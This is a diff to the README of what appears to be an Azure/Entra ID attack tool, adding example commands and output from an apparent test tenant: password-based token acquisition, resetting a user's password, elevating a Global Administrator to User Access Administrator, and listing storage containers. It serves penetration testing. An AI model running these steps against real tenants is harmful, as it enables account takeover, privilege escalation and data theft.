@@ -341,7 +341,16 @@ Now with a set of valid credentials we can authenticate to relevant resource pla
 ```bash
 entruder login ropc -t <CLIENT_ID> -c <CLIENT_ID> -u '<UPN>' -p '<PASSWORD>'
 ```
-<img width="1861" height="223" alt="image" src="https://github.com/user-attachments/assets/94d4c606-ab70-46f6-8bdc-3d647cdab2de" />
+```bash
+$ entruder login ropc -t 7a930b37-b80e-4c65-a674-9bffa7b7a42a -c azurecli -u testuser@satesto2026outlook.onmicrosoft.com -p 'EntruderIsTheTool123!'
+
+[+] Graph Token acquired successfully!
+[+] Management Token acquired successfully!
+[+] Storage Token acquired successfully!
+[+] Keyvault Token acquired successfully!
+[+] Session saved for tenant: 7a930b37-b80e-4c65-a674-9bffa7b7a42a
+
+```
 
 #### Tenant Enumeration
 We can begin enumeration by getting a list of subscriptions, an example below shows a single subscription with its respective id, which will be used as an argument in further commands
@@ -365,6 +374,67 @@ entruder enum users
 ```
 <img width="1018" height="373" alt="image" src="https://github.com/user-attachments/assets/b7f831c8-19da-4b75-b296-c3b5e1e65f56" />
 
+
+### Modifying a user's password
+```bash
+$ entruder set password -u <TARGET_UPN> -p <NEW_PASSWORD>
+```
+```bash
+$ entruder set password -u jtest@satesto2026outlook.onmicrosoft.com -p 'ChangedPassword123!'
+[+] Password for abfc890f-7d22-40... successfully changed to ChangedPassword123!
+```
+### Elevating Privileges in the ARM plane from Global Administrator
+You can use Entruder with a Global Administrator Account to elevate their ARM privileges to User Access Administrator, so that you access all ARM resources
+```bash
+entruder exploit elevate
+```
+```bash
+$ entruder exploit elevate
+
+[+] Global Administrator successfully elevated to User Access Administrator
+[!] Re-authenticate to refresh your token before running Azure resource commands
+```
+### Enumerating Resources
+Entruder provides command to enumerate and intract with ARM resources
+```bash
+entruder enum resources -s <SUBSCRIPTION_ID>
+```
+```bash
+entruder enum resources -s 3e8cfe1d-4e52-4beb-8679-4eda267cc128                              
+
+[
+  {
+    "id": "/subscriptions/3e8cfe1d-4e52-4beb-8679-4eda267cc128/resourceGroups/rg-1/providers/Microsoft.Storage/storageAccounts/beststorageintheworld",
+    "name": "beststorageintheworld",
+    "type": "Microsoft.Storage/storageAccounts",
+    "sku": {
+      "name": "Standard_LRS",
+      "tier": "Standard"
+    },
+    "kind": "StorageV2",
+    "location": "italynorth",
+    "tags": {}
+  },
+[...]
+```
+For example we can target the "beststorageintheworld" storage account to get its containers
+#### Enumerating containers in a storage account
+```bash
+entruder enum containers -a <STORAGE_ACCOUNT_NAME>
+```
+```bash
+entruder enum containers -a beststorageintheworld
+
+Containers in beststorageintheworld
+Name                : secretscontainer
+Public Access       : N/A
+Last Modified       : Thu, 03 Sep 2026 07:46:50 GMT
+Lease Status        : unlocked
+Lease State         : available
+Immutability Policy : false
+Legal Hold          : false
+1 containers total
+```
 ### Compute Exploitation
 Entruder can be used to abuse compute resources via "Contributor" role assigned users to execute code and extract managed identity tokens, an example of this would be Function Apps.
 ```bash
